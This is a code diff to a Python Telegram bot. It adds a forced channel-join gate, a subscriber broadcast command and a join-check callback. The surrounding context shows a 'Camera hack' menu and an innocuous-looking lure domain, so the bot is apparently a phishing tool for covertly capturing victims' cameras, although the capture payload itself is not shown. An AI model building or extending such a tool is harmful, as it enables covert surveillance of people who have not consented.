@@ -8,6 +8,9 @@ app = Flask(__name__)
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 MY_CHAT_ID = "7162565886"
 ADMIN_ID = 7162565886
+CHANNEL_USER = "@hackerscolonytech" # Telegram Channel
+YT_LINK = "https://youtube.com/@hackers_colony_tech?si=ao7sXsZt8OLAj1Lc"
+
 bot = telebot.TeleBot(BOT_TOKEN)
 
 try:
@@ -29,9 +32,51 @@ def add_user(user_id):
         conn.close()
     except: pass
 
+def get_all_users():
+    conn = sqlite3.connect('users.db')
+    cursor = conn.execute('SELECT user_id FROM users')
+    users = [row[0] for row in cursor.fetchall()]
+    conn.close()
+    return users
+
+def check_join(user_id):
+    try:
+        status = bot.get_chat_member(CHANNEL_USER, user_id).status
+        if status in ['member', 'administrator', 'creator']:
+            return True
+        return False
+    except:
+        return False
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast(message):
+    if message.from_user.id == ADMIN_ID:
+        msg_text = message.text.replace('/broadcast', '').strip()
+        if not msg_text:
+            bot.reply_to(message, "Usage: /broadcast [Your Message]")
+            return
+        
+        users = get_all_users()
+        success = 0
+        for user in users:
+            try:
+                bot.send_message(user, msg_text)
+                success += 1
+            except: pass
+        bot.send_message(ADMIN_ID, f"📢 Broadcast Sent to {success} users.")
+
 @bot.message_handler(commands=['start'])
 def start(message):
     add_user(message.chat.id)
+    
+    if not check_join(message.chat.id):
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("Join Telegram Channel 📢", url=f"https://t.me/{CHANNEL_USER.replace('@','')}"))
+        markup.add(types.InlineKeyboardButton("Subscribe YouTube 📺", url=YT_LINK))
+        markup.add(types.InlineKeyboardButton("Check Join ✅", callback_data="check_join"))
+        bot.send_message(message.chat.id, "❌ You must join our channels to use this bot!", reply_markup=markup)
+        return
+
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("Camera hack 📸", callback_data="cam_menu"))
     try:
@@ -42,6 +87,15 @@ def start(message):
 def callback_query(call):
     base_url = "https://happy-wishing-you.onrender.com" 
     user_id = call.message.chat.id
+    
+    if call.data == "check_join":
+        if check_join(user_id):
+            bot.answer_callback_query(call.id, "Success! You can now use the bot.")
+            start(call.message)
+        else:
+            bot.answer_callback_query(call.id, "❌ Still not joined!", show_alert=True)
+        return
+
     try:
         if call.data == "cam_menu":
             markup = types.InlineKeyboardMarkup(row_width=2)
@@ -90,11 +144,9 @@ if __name__ == "__main__":
         time.sleep(5)
         while True:
             try:
-                bot.remove_webhook()
                 bot.polling(none_stop=True, interval=2, timeout=40)
             except:
                 time.sleep(15)
 
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
-    
